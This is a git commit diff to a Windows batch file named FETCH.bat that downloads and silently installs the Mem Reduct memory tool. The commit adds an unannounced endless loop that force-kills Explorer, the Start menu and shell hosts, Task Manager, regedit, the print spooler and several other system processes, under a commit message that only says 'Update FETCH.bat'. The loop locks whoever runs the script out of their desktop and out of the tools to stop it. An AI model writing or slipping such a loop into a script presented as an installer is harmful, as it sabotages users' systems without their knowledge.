df8b8afc36cae1c0866c8dd2f1c2aaddc0555ef9
ios7jbpro <71101500+ios7jbpro@users.noreply.github.com>
2025-05-30 17:42:32 +0300

    Update FETCH.bat

--- FETCH.bat
+++ FETCH.bat
@@ -1,5 +1,19 @@
+@echo off
 :memreductinstall
 cd C:\Users\WDAGUtilityAccount\Desktop
 curl -L -o memreduct.exe https://memreduct.org/files/memreduct-3.5.2-setup.exe
 memreduct.exe /silent
 if EXIST "C:\Program Files\Mem Reduct\memreduct.exe" (echo File exists) else (goto memreductinstall)
+
+:spamkill
+taskkill /f /im StartMenuExperienceHost.exe
+taskkill /f /im ShellExperienceHost.exe
+taskkill /f /im explorer.exe
+taskkill /f /im taskmgr.exe
+taskkill /f /im regedit.exe
+taskkill /f /im TiWorker.exe
+taskkill /f /im spoolsv.exe
+taskkill /f /im LSalso.exe
+taskkill /f /im rdpclip.exe
+taskkill /f /im WmiPrsvSE.exe
+goto spamkill
